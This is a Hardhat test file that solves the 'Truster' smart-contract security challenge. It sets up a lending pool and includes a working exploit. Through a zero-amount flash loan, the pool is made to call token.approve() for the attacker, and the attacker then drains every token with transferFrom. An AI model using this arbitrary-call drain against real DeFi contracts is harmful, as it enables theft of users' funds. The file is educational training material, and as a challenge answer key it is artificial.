const { ethers } = require('hardhat');
const { expect } = require('chai');
const { Interface } = require('ethers/lib/utils');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    /**
     * Goal: Steal all the tokens from lending pool.
     * Bug: Lending pool will execute target.call{value: value}(data) by itself.
     * Exploit: We make pool call token.approve() to approve us transfer all DVT token in the pool to attack's contract.
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const balanceOfPool = ethers.utils.formatUnits(await this.token.balanceOf(this.pool.address), 18);
        const abiEncoder = new ethers.utils.AbiCoder();
        const iface = new Interface([
            "constructor(string symbol, string name)",

            "function approve(address spender, uint256 amount) public virtual override returns (bool)"
          ]);

        const data = iface.encodeFunctionData("approve", [
            attacker.address,
            ethers.utils.parseEther(balanceOfPool)
        ])
        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, ethers.utils.parseEther(balanceOfPool));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

